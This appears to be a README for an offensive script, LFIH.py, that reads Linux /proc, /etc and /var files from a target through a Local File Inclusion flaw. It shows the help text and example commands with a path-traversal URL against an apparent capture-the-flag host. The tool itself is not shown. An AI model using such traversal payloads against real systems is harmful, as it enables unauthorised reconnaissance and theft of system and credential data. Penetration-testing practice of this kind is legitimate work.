# 💫 Linux Sysinfo Harvester via LFI 💫
Linux System Information Harvesting through Local File Inclusion (LFI) Vulnerability 🐱

```
└──╼ $python3 LFIH.py -u http://bagel.htb:8000/?page=../../../../ -h

                      __      _
                    o'')}____//
                    `_/      )
                    (_(_/-(_/
    ██      ███████ ██ ██   ██ 
    ██      ██      ██ ██   ██ 
    ██      █████   ██ ███████ 
    ██      ██      ██ ██   ██ 
    ███████ ██      ██ ██   ██                        
                    
                    Yazidou                                                                   

usage: LFIH.py [-h] -u U [-t T] [-proc] [-net] [-cmdlines] [-etc] [-var] [-all] [-p P] [-x64]

[*] Simple script for information retrieving through Local File Inclusion.

optional arguments:
  -h, --help  show this help message and exit
  -u U        Target URL
  -t T        Threads
  -proc       Retrieving on /proc
  -net        Network status (Routes, TCP, UDP, ARP) from /proc/net
  -cmdlines   Retrieving of 1-MAX_PID cmdlines on /proc/{PIDs}/cmdlines (default MAX_PID for x32, use -x64 to increase)
  -etc        Retrieving on /etc
  -var        Retrieving on /var
  -all        Retrieving all of the above
  -p P        Pathern to skip for cmdlines (i.e. NotFounds strings)
  -x64        Targeting an x64 machine (x32 by default)

```

# Examples 👨‍🎤
Retrieving processus informations : <br>
```python3 LFIH.py -u http://bagel.htb:8000/?page=../../../../ -proc```

Retrieving processes cmdlines (args) through 100 sync threads to increase speed : <br>
```python3 LFIH.py -u http://bagel.htb:8000/?page=../../../../ -cmdlines -t 100```

Retrieving processes cmdlines (args) with 50 threads and escaping "File not found" response string : <br>
```python3 LFIH.py -u http://bagel.htb:8000/?page=../../../../ -cmdlines -t 50 -p "File not found"```

# Screenshots 🍩
<img src="https://i.ibb.co/HVHYcmw/image.png">
<img src="https://i.ibb.co/jk5H2hb/image.png">





